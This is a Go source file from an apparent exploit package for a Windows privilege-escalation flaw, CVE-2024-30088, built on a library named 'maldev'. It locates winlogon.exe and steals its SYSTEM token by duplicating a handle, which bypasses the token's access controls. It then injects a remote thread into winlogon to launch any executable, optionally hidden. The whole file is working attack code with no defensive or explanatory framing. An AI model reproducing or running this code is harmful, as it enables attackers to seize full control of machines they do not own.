//go:build windows

package cve202430088

import (
	"fmt"
	"syscall"

	"github.com/oioio-space/maldev/inject"
	"github.com/oioio-space/maldev/process/enum"
	"github.com/oioio-space/maldev/win/ntapi"
	"github.com/oioio-space/maldev/win/token"
	"golang.org/x/sys/windows"
)

// findWinlogonPID enumerates running processes and returns the PID of
// winlogon.exe.
func findWinlogonPID() (uint32, error) {
	procs, err := enum.FindByName("winlogon.exe")
	if err != nil {
		return 0, fmt.Errorf("enumerate processes: %w", err)
	}
	if len(procs) == 0 {
		return 0, fmt.Errorf("winlogon.exe not found in process list")
	}
	return procs[0].PID, nil
}

// stealToken extracts a SYSTEM token from winlogon using the DuplicateHandle
// bypass technique. OpenProcessToken respects the token's DACL and would fail;
// DuplicateHandle from the remote handle table bypasses it.
//
// Delegates to ntapi.FindHandleByType + token.StealViaDuplicateHandle.
func stealToken(hProcess windows.Handle, winlogonPID uint32) (syscall.Handle, error) {
	// Open our own token as a reference to discover the ObjectTypeIndex for tokens.
	currentProcess, _ := windows.GetCurrentProcess()
	var ownToken windows.Token
	if err := windows.OpenProcessToken(currentProcess, windows.TOKEN_QUERY, &ownToken); err != nil {
		return 0, fmt.Errorf("OpenProcessToken (self): %w", err)
	}
	defer ownToken.Close()

	// Find a token handle in winlogon via system handle enumeration.
	remoteTokenHandle, err := ntapi.FindHandleByType(winlogonPID, windows.Handle(ownToken))
	if err != nil {
		return 0, fmt.Errorf("find token handle in winlogon: %w", err)
	}

	// Duplicate and return as primary token.
	tok, err := token.StealViaDuplicateHandle(hProcess, remoteTokenHandle)
	if err != nil {
		return 0, fmt.Errorf("steal via DuplicateHandle: %w", err)
	}

	// Transfer ownership — Detach zeroes the wrapper so its handle is not
	// double-closed when tok goes out of scope.
	return syscall.Handle(tok.Detach()), nil
}

// createElevatedProcess injects a remote thread into winlogon to launch
// an executable via WinExec. Delegates to inject.RemoteExec.
func createElevatedProcess(hProcess windows.Handle, exePath string, args []string, hidden bool) error {
	return inject.RemoteExec(hProcess, exePath, args, hidden, 5000)
}
